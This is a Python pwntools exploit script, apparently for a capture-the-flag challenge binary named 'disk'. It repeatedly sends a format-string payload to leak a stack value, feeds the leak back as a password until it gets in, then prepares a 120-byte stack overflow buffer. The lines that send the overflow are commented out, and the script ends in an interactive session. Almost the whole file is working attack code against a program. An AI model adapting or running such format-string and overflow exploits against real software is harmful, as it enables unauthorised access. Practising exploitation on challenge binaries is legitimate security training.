#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template disk
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('disk')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x004008cb
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
import time
# 0x1caa03
while True:
    io = start()
    io.sendline(b'AAAA' + b'-%p-%9$08x')
    pw = io.recvuntil(b'AAAA')
    pw = io.recvline().decode().strip()[1:]
    print("PW: ", pw)
    io.sendline(pw)
    time.sleep(0.1)
    io.recvline()
    out = io.recv(500)
    print('Out:', out)
    if b"Troubleshooting" in out:
        break

print("Found")

io.sendline(b'3')
junk = b'lmao'
payload = b'A'*120 

#io.sendline(junk)
#io.sendline(payload)

io.interactive()

